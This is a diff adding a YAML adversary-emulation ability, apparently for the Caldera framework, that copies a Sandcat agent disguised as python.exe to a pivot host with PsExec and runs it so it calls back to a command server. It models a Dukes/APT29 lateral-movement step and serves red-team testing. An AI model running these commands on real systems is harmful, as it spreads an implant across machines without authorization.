@@ -1,0 +1,40 @@
+- id: bddc0abc-07a0-41b7-813f-e0c64d9226b3
+  name: Copy Sandcat File
+  description: Copy Sandcat file using PsExec
+  tactic: lateral-movement
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_lat_movement
+  procedure_step: "8.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force;
+          set-location "C:\Program Files\SysinternalsSuite\";
+          .\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d -f -c "C:\Windows\Temp\python.exe" -group "day-1-lateral-movement" -server "#{server}";
+          tasklist /S #{pivot_machine_hostname} /FI "IMAGENAME eq python.exe";
+        payloads:
+        - sandcat.go-windows-upx
+
+  input_arguments:
+    pivot_machine_hostname:
+      description: Hostname of pivot machine
+      type: string
+      default: pivothost
+
+    user.session.id:
+      description: Session id for user
+      type: string
+      default: "1"
+
+    server:
+      description: IP or Hostname of server
+      type: string
+      default: 192.0.2.10
+
+  executors:
+  - name: powershell
+    command: |
